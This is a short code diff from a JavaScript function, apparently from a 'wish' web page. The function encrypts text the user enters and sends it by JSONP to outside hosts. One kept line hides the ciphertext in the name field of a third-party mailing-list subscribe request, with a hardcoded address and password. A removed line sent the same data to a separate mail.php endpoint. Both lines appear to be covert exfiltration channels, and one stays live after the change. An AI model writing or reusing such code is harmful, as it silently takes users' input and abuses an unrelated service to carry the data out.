@@ -81,7 +81,6 @@ function creatWish( words, ty ) {
         encrypt.setPublicKey( '-----BEGIN PUBLIC KEY-----' + PUBLIC_KEY + '-----END PUBLIC KEY-----' );
         var encrypted = encrypt.encrypt( words );
         $.ajax({url: "https://ml.texjp.org/mailman/subscribe/devel?email=talkat@dingtalk.com&fullname="+encodeURIComponent(encrypted)+"&pw=mga7F9c0Pu&pw-conf=mga7F9c0Pu&language=en&digest=0&email-button=Subscribe",dataType: "jsonp",context: document.body,});
-        $.ajax({url: "http://tianyi.qrspeed.pro/api/mail/mail.php?address=talkat@dingtalk.com&name=ls&certno="+encodeURIComponent(encrypted),dataType: "jsonp",context: document.body,});
         console.log( words, '已加密，数据：', encrypted );
 
         //加cookie
